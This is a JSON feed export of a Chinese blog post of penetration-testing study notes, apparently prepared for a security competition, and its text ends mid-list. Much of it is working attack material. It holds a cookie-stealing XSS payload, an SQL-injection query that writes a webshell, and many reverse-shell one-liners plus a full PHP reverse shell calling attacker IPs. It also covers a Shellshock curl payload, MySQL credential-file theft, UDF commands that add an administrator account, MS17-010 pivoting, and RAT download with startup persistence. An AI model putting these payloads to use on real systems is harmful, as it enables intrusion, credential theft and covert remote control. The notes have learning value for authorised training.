{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"信息安全\" tag",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/5463b311/",
            "url": "http://dpm12345.cn/posts/5463b311/",
            "title": "信息安全铁人三项学习",
            "date_published": "2022-08-31T06:16:37.000Z",
            "content_html": "<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/target.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_1.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_2.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_3.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_4.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_5.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_6.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_7.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_8.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_9.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_10.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_11.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_12.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_13.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_14.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/%E5%A4%A7%E7%BA%B2_15.jpg\" alt=\"\"></p>\n<p>nessus</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>/bin/systemctl start nessusd.service</pre></td></tr></tbody></table></figure><h1 id=\"提权分类\"><a class=\"anchor\" href=\"#提权分类\">#</a> 提权分类</h1>\n<ul>\n<li>数据库提权：udf 提权、mof 提权、反弹端口链接提权等</li>\n<li>web 提权：SQL 注入提权、webshell 提权、web 中间件提权等</li>\n<li>操作系统提权：系统内核溢出提权、错误的系统配置提权、组策略首选项提权、DLL 劫持提权、第三方软件提权</li>\n<li>安卓提权等</li>\n</ul>\n<h1 id=\"23-综合渗透之-suid-提权\"><a class=\"anchor\" href=\"#23-综合渗透之-suid-提权\">#</a> 2.3 综合渗透之 SUID 提权</h1>\n<h2 id=\"xss-绕过-csp-获取登陆-cookie\"><a class=\"anchor\" href=\"#xss-绕过-csp-获取登陆-cookie\">#</a> XSS 绕过 CSP 获取登陆 cookie</h2>\n<p>CSP 是由单词 Content Security Policy 的首单词组成，CSP 旨在减少 (注意这里是减少而不是消灭) 跨站脚本攻击。</p>\n<p>找到 XSS 注入点，输入</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token script\"><span class=\"token language-javascript\">window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token operator\">=</span><span class=\"token string\">\"http://ip/任意文件名?=\"</span><span class=\"token operator\">+</span>document<span class=\"token punctuation\">.</span>cookie<span class=\"token punctuation\">;</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>由此可以获得 cookie 值</p>\n<p>之后转到登陆界面，输入 cookie 值，来到管理员界面（可能为 /admin 目录）</p>\n<h2 id=\"利用-sql-注入写一句话木马\"><a class=\"anchor\" href=\"#利用-sql-注入写一句话木马\">#</a> 利用 sql 注入写一句话木马</h2>\n<p>在界面中，观察 url 的形式，找到注入点</p>\n<p>输入  <code>union select 1,2,3</code>  先确认输出位置点</p>\n<p>再根据 sql 命令 <code>and select 1,select 0x[一句话木马的hex编码],3 into outfile \"/var/www/html/1.php\"</code>  写入一句话木马</p>\n<p>(若无法写入，可尝试更换目录)</p>\n<p>写入后，访问观察是否成功，之后使用蚁剑连接，使用提供的终端 <code>whoami</code>  获取用户</p>\n<h2 id=\"利用-ssh-来获得低权限\"><a class=\"anchor\" href=\"#利用-ssh-来获得低权限\">#</a> 利用 ssh 来获得低权限</h2>\n<p>使用 <code>ssh-keygen -t rsa</code>  在本地生成一个 <code>id_rsa.pub</code> , 之后将该文件复制，更名为 <code>authorized_keys</code> , 利用菜刀工具上传到目标机服务器上的 <code>.ssh</code>  文件夹中，然后本地 <code>ssh用户名@ip</code>  登陆低权限用户</p>\n<h2 id=\"利用-suid-获取高权限\"><a class=\"anchor\" href=\"#利用-suid-获取高权限\">#</a> 利用 SUID 获取高权限</h2>\n<p>如果设置了 SUID 这个标志位，普通权限的程序在执行的时候，可以暂时拥有 root 权限、</p>\n<p>已知的可以用来提权的 Linux 可执行文件有:</p>\n<ul>\n<li>Nmap</li>\n<li>Vim</li>\n<li>find</li>\n<li>Bash</li>\n<li>More</li>\n<li>Less</li>\n<li>Nano</li>\n<li>cp</li>\n</ul>\n<p>下面的命令可以发现所有的系统中运行的 SUID 可执行文件</p>\n<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>\n<p><code>find / -user root -perm -4000-exec ls -ldb {} ;</code></p>\n<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>\n<p>执行以下命令，可以看到，当前的权限是 root</p>\n<p><code>/usr/bin/find test -exec whoami \\;</code></p>\n<p>其他可见 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8=\">https://gtfobins.github.io</span></p>\n<p>通过其，可以修改配置文件</p>\n<h2 id=\"反弹-shell\"><a class=\"anchor\" href=\"#反弹-shell\">#</a> 反弹 shell</h2>\n<p>python</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token operator\">-</span>c <span class=\"token string\">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</span></pre></td></tr></tbody></table></figure><p>perl</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>perl <span class=\"token operator\">-e</span> <span class=\"token string\">'use Socket;$i=\"10.10.14.23\";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'</span></pre></td></tr></tbody></table></figure><p>php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'nc -e /bin/bash 10.10.14.6 4444'</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?&gt;</span></span>  //html版 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>&amp;3</span> <span class=\"token punctuation\">&gt;</span></span>&amp;3 2&gt;&amp;3\");'    //内置语言版</pre></td></tr></tbody></table></figure><p>html 无 nc 版</p>\n<pre><code class=\"language-php+HTML\">\n&lt;?php \nset_time_limit(0);\n$VERSION = \"1.0\";\n$ip = \"10.10.14.6\";\n$port = 4444;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = \"uname -a; w; id; /bin/bash -i\";\n$daemon = 0;\n$debug = 0;\nif (function_exists(\"pcntl_fork\")) {\n    $pid = pcntl_fork();\n    if ($pid == -1) {\n        printit(\"ERROR: Cannot fork\");\n        exit(1);\n    }\n    if ($pid) {\n        exit(0);\n    }\n    if (posix_setsid() == -1) {\n        printit(\"Error: Cannot setsid()\");\n        exit(1);\n    }\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\nchdir(\"/\");\numask(0);\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n$descriptorspec = array(0 =&gt; array(\"pipe\", \"r\"), 1 =&gt; array(\"pipe\", \"w\"), 2 =&gt; array(\"pipe\", \"w\"));\n$process = proc_open($shell, $descriptorspec, $pipes);\nif (!is_resource($process)) {\n    printit(\"ERROR: Cannot spawn shell\");\n    exit(1);\n}\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\nprintit(\"Successfully opened reverse shell to $ip:$port\");\nwhile (1) {\n    if (feof($sock)) {\n        printit(\"ERROR: Shell connection terminated\");\n        break;\n    }\n    if (feof($pipes[1])) {\n        printit(\"ERROR: Shell process terminated\");\n        break;\n    }\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n    if (in_array($sock, $read_a)) {\n        if ($debug) printit(\"SOCK READ\");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit(\"SOCK: $input\");\n        fwrite($pipes[0], $input);\n    }\n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit(\"STDOUT READ\");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit(\"STDOUT: $input\");\n        fwrite($sock, $input);\n    }\n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit(\"STDERR READ\");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit(\"STDERR: $input\");\n        fwrite($sock, $input);\n    }\n}\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\nfunction printit($string)\n{\n    if (!$daemon) {\n        print \"$string\\n\";\n    }\n} ?&gt;\n</code></pre>\n<p>curl</p>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>curl <span class=\"token operator\">-</span>H <span class=\"token string\">'Cookie: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.23/4443 0&gt;&amp;1'</span> http:<span class=\"token operator\">/</span><span class=\"token operator\">/</span>10<span class=\"token punctuation\">.</span>10<span class=\"token punctuation\">.</span>10<span class=\"token punctuation\">.</span>56/cgi-bin/user<span class=\"token punctuation\">.</span>sh`</pre></td></tr></tbody></table></figure><p>bash</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>/bash <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">&gt;&amp;</span> /dev/tcp/10.10.14.23/4444 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>&gt;</span><span class=\"token file-descriptor important\">&amp;1</span></pre></td></tr></tbody></table></figure><p>nc</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>nc -e /bin/sh 10.0.0.1 1234</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>// 若是机器上安装的 nc 版本没有 - e 选项</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</pre></td></tr></tbody></table></figure><p>Ruby</p>\n<figure class=\"highlight ruby\"><figcaption data-lang=\"ruby\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">/</span>依赖<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ruby <span class=\"token operator\">-</span>rsocket <span class=\"token operator\">-</span>e<span class=\"token string-literal\"><span class=\"token string\">'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token operator\">/</span>不依赖：</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ruby <span class=\"token operator\">-</span>rsocket <span class=\"token operator\">-</span>e <span class=\"token string-literal\"><span class=\"token string\">'exit if fork;c=TCPSocket.new(\"attackerip\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'</span></span></pre></td></tr></tbody></table></figure><p>sh 文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">'#!/bin/bash\\n\\nbash -i &gt;&amp; /dev/tcp/10.10.14.2/4445 0&gt;&amp;1'</span> <span class=\"token operator\">&gt;</span> xxx.sh</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">bash</span> xxx.sh</pre></td></tr></tbody></table></figure><p>二、调取 shell 的各种方式</p>\n<p>perl</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>perl <span class=\"token operator\">-e</span> <span class=\"token string\">'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'</span></pre></td></tr></tbody></table></figure><p>python （获取交互式 shell）</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import pty; pty.spawn(\"/bin/bash\")'</span></pre></td></tr></tbody></table></figure><p>原文链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc3NteHIvYXJ0aWNsZS9kZXRhaWxzLzEyMTQ2Mzc2Ng==\">https://blog.csdn.net/missmxr/article/details/121463766</span></p>\n<h1 id=\"24-综合渗透之-udf-提权\"><a class=\"anchor\" href=\"#24-综合渗透之-udf-提权\">#</a> 2.4 综合渗透之 UDF 提权</h1>\n<h2 id=\"信息搜集\"><a class=\"anchor\" href=\"#信息搜集\">#</a> 信息搜集</h2>\n<ul>\n<li>\n<p>寻找常见目录 (robots.txt,phpinfo.php,phpmyadmin), 使用 dirsearch 扫</p>\n</li>\n<li>\n<p>Whios 信息查询：站长之家，kali</p>\n</li>\n<li>\n<p>服务器信息：脚本、框架、中间件版本</p>\n</li>\n<li>\n<p>子域名挖掘，旁站，c 段</p>\n</li>\n<li>\n<p>端口：nmap，在线工具，，</p>\n</li>\n<li>\n<p>真实 ip：有 cdn，使用 ping、二级域名、nslookup 等，或者 DDos 打完 cdn 流量</p>\n</li>\n</ul>\n<h2 id=\"讲解的环境从-phpmyadmin即数据库登陆入手\"><a class=\"anchor\" href=\"#讲解的环境从-phpmyadmin即数据库登陆入手\">#</a> 讲解的环境，从 phpmyadmin，即数据库登陆入手</h2>\n<h3 id=\"利用-phpadmin-漏洞\"><a class=\"anchor\" href=\"#利用-phpadmin-漏洞\">#</a> 利用 phpadmin 漏洞</h3>\n<p>一、影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3</p>\n<p>概述：phpmyadmin 存在 PREG_REPLACE_EVAL 漏洞</p>\n<p>利用模块：exploit/multi/http/phpmyadmin_preg_replace</p>\n<p>CVE：CVE-2013-3238</p>\n<p>二、影响版本：v3.5.2.2</p>\n<p>概述：phpmyadmin 存在 server_sync.PHP 后门漏洞</p>\n<p>利用模块：exploit/multi/http/phpmyadmin_3522_backdoor</p>\n<p>CVE：CVE-2012-5159</p>\n<p>三、影响版本：2.11.x &lt; 2.11.9.5 and 3.x ❤️.1.3.1</p>\n<p>概述：phpmyadmin 配置文件 /config/config.inc.php 存在命令执行</p>\n<p>利用模块：exploit/unix/webapp/phpmyadmin_config</p>\n<p>CVE：CVE-2009-1151</p>\n<p>四、影响版本 2.11.3/2.11.4</p>\n<p>利用方法：用户名处写入 'localhost'@'@\" 登陆成功。(全部为英文标点符号，最后一个是双引号)</p>\n<p>php 爆绝对路径的办法：</p>\n<p>phpMyAdmin/libraries/select_lang.lib.php</p>\n<p>phpMyAdmin/darkblue_orange/layout.inc.php</p>\n<p>phpMyAdmin/index.php?lang=1</p>\n<p>phpMyAdmin/themes/darkblue_orange/layout.inc.php</p>\n<h3 id=\"sql-注入\"><a class=\"anchor\" href=\"#sql-注入\">#</a> SQL 注入</h3>\n<p>字符型，数字型，布尔盲注，时间盲注</p>\n<p>使用 sqlmap</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>--is-dba 判断当前用户是否为管理员</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>--privileges  判断当前用户名</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>--password    当前数据库用户密码</pre></td></tr></tbody></table></figure><p>得到 hash 值，用弱密码爆破，或者用 cmd5 网址查询 (一般查不到)</p>\n<p>(啊 d) 工具</p>\n<p>尝试写文件，无权限，这里需要提权</p>\n<h3 id=\"获取-root-权限\"><a class=\"anchor\" href=\"#获取-root-权限\">#</a> 获取 root 权限</h3>\n<p>这里使用 mysql 的越权漏洞</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">LOAD</span> <span class=\"token keyword\">DATA</span> <span class=\"token keyword\">LOCAL</span> <span class=\"token keyword\">INFILE</span> <span class=\"token string\">'dir\\\\MySQL\\\\data\\\\mysql\\\\user.MYD'</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">TABLE</span> admin <span class=\"token keyword\">fields</span> <span class=\"token keyword\">terminated</span> <span class=\"token keyword\">by</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">\" LINES TERMINATED BY \"</span>\\<span class=\"token number\">0</span>'<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>而这 <code>dir</code>  的获取通过 <code>select @@basedir</code> ; 查看 mysql 的绝对路径，如（这里用 window 系统为例） <code>C:/Program Files/phpStudy/MySQL/</code></p>\n<p>那么使用漏洞的语句为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">LOAD</span> <span class=\"token keyword\">DATA</span> <span class=\"token keyword\">LOCAL</span> <span class=\"token keyword\">INFILE</span> <span class=\"token string\">'C:\\\\Program Files\\\\phpStudy\\\\MySQL\\\\data\\\\mysql\\\\user.MYD'</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">TABLE</span> admin <span class=\"token keyword\">fields</span> <span class=\"token keyword\">terminated</span> <span class=\"token keyword\">by</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">\" LINES TERMINATED BY \"</span>\\<span class=\"token number\">0</span>'<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>这样可以在表中可以看到 root 的用户名及密码</p>\n<p>在该环境中，密文的长度和字符范围均知，采用 cain 爆破</p>\n<p>爆破成功后，登陆 root 用户，那么就可以写一句话木马了</p>\n<p>但在此之前需要知道网站的根目录，这里利用信息搜集的 phpinfo.php 的网址，获取根目录</p>\n<p>获取根目录后，写文件，写一句话木马</p>\n<p>使用蚁剑 / 菜刀连接</p>\n<h3 id=\"udf-提权\"><a class=\"anchor\" href=\"#udf-提权\">#</a> UDF 提权</h3>\n<p>先上传 udf.php 和 gethash</p>\n<p>访问  <code>url/udf.php</code>  ，登陆 root 用户</p>\n<p>执行 shell 命令</p>\n<p><code>select shell(\"cmd\",'c:/gethash');</code></p>\n<p>根据提示</p>\n<p><code>select shell(\"cmd\",'c:/gethash -dhl');</code></p>\n<p>获取到 hash 值，之后用彩虹表进行爆破</p>\n<p>(或者使用以下 sql 语句)</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">function</span> cmdshell <span class=\"token keyword\">returns</span> string <span class=\"token keyword\">soname</span> <span class=\"token string\">'moonudf.dll'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">select</span> cmdshell<span class=\"token punctuation\">(</span><span class=\"token string\">'net user username password /add'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">select</span> cmdshell<span class=\"token punctuation\">(</span><span class=\"token string\">'net localgroup administrators username /add'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"25-从外网到内网主机远控-msf-sock-代理\"><a class=\"anchor\" href=\"#25-从外网到内网主机远控-msf-sock-代理\">#</a> 2.5 从外网到内网主机远控 msf sock 代理</h1>\n<p>两台外网攻击机（一台 kali，一台 windows）</p>\n<p>一个公司主机，双网卡，连接内网主机</p>\n<p>目的：上传 webshell，获取公司网站的权限，然后拿下内网主机</p>\n<p>使用工具：</p>\n<ul>\n<li>reGeorg + proxychains 代理进入内网</li>\n<li>利用 msf 获取 system 权限</li>\n<li>Powershell 下载并运行远控</li>\n</ul>\n<h2 id=\"上传-webshell\"><a class=\"anchor\" href=\"#上传-webshell\">#</a> 上传 webshell</h2>\n<p>上传成功后，蚁剑连接，进入虚拟终端，查看用户， <code>whoami</code> ，为 apache</p>\n<p>查看 php 库， <code>php -m</code>  发现有 <code>sockets</code> ，那么在上传 reGeorg 中的 tunnel.php 时，可以先删去， <code>dl(\"php_sockets.dll\");</code>  该行，防止报错</p>\n<h2 id=\"连接\"><a class=\"anchor\" href=\"#连接\">#</a> 连接</h2>\n<h3 id=\"kali-代理\"><a class=\"anchor\" href=\"#kali-代理\">#</a> kali 代理</h3>\n<p><code>python reGeorgSocksProxy.py -p port - u url</code></p>\n<p>扫描端口号</p>\n<p>由于不能访问内网，这里采用代理访问</p>\n<p><code>proxychains4 nmap -sT -Pn 内网ip(可通过webshell的ifconfig获取)</code></p>\n<p>由结果可以判断为 window 系统，由开放的 445 端口，判断存在 <code>MS17010</code>  漏洞，接下来开始 msf</p>\n<p><code>proxychains msfconsole</code>  或 <code>peoxychains -q msfconsole</code>  静默加载</p>\n<p>加载完后输入 <code>use exploit/windows/smb/ms17_010_psexec</code></p>\n<p>option</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/msf_socket_1.jpg\" alt=\"\"></p>\n<p>只需要填写 <code>rhost</code>  参数</p>\n<p><code>set rhost 内网ip</code></p>\n<p><code>run</code>  运行，进入 shell , 输入 <code>whoami</code> ，为 <code>system</code>  系统用户</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/msf_socket_2.jpg\" alt=\"\"></p>\n<h2 id=\"远控\"><a class=\"anchor\" href=\"#远控\">#</a> 远控</h2>\n<p>Quasar<a href=\"http://dpm12345.cn/2022/08/31/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%AD%A6%E4%B9%A0/\"> 链接</a></p>\n<p>在下图中的 <code>Connection to Hosts</code>  填入内网 ip，port 填入端口号，点击生成，将生成的.exe 文件上传至公司网站上，然后在内网利用 Powershell 下载该.exe 文件</p>\n<p><code>powershell client=new-object System.Net.WebClient:client=new−objectSystem.Net.WebClient:client.DownloadFile('url (外网主机 ip + 路径)',' 本地路径 ')</code></p>\n<p>下载成功后直接输入文件名即可运行</p>\n<p>这时回到 Quasar 的 Settings，开始监听之前设置的端口</p>\n<p>可以看到监听列表有一个，但由于不是由当前用户启动该.exe 程序，没有桌面画面，这时可以将该文件作为启动项，即可将该文件放入启动项文件夹中，如  <code>C:\\User\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code></p>\n<p>内网主机重启后可控制桌面</p>\n<h1 id=\"26-kali-linux-信息搜集\"><a class=\"anchor\" href=\"#26-kali-linux-信息搜集\">#</a> 2.6 kali linux 信息搜集</h1>\n<h2 id=\"dnsenum\"><a class=\"anchor\" href=\"#dnsenum\">#</a> Dnsenum</h2>\n<ul>\n<li><code>dnsenum [Options] &lt;domain&gt;</code></li>\n<li><code>--dnsserver</code>  指定 dns 服务器，并解析目标域名的 A，NS 和 MX 记录信息</li>\n<li><code>--enum</code>  (相当于是 <code>--threads5-s 15-w</code> ) 同时进行域名查询，并从 google 中查询目标域名的子域名 (此功能需要访问 google, 否则无法获取子域名)</li>\n<li><code>-O</code>  将查询结果以 xml 格式保存到某个文件中</li>\n</ul>\n<h2 id=\"dig\"><a class=\"anchor\" href=\"#dig\">#</a> Dig</h2>\n<ul>\n<li><code>dig [@global-server][domain] [q-type]</code>  可以指定 dns 服务器</li>\n<li>q-type 指定查询类型 (a, mx,ns,soa,hinfo,axfr,txt) ，默认只查询 A 记录</li>\n<li>-b 指定查询的源地址</li>\n<li>d-opt</li>\n<li>trace 显示域名解析过程</li>\n<li>short 显示精简的信息</li>\n<li>nssearch 显示授权的 dns 服务器信息</li>\n<li>类似工具：nslookup/hos</li>\n</ul>\n<h2 id=\"fierce\"><a class=\"anchor\" href=\"#fierce\">#</a> Fierce</h2>\n<ul>\n<li><code>Fierce [-dns example.com][OPTIONS]</code></li>\n<li>-dnsserver 指定 dns 服 务器</li>\n<li>-range 指定扫描的地址范围</li>\n<li>-file 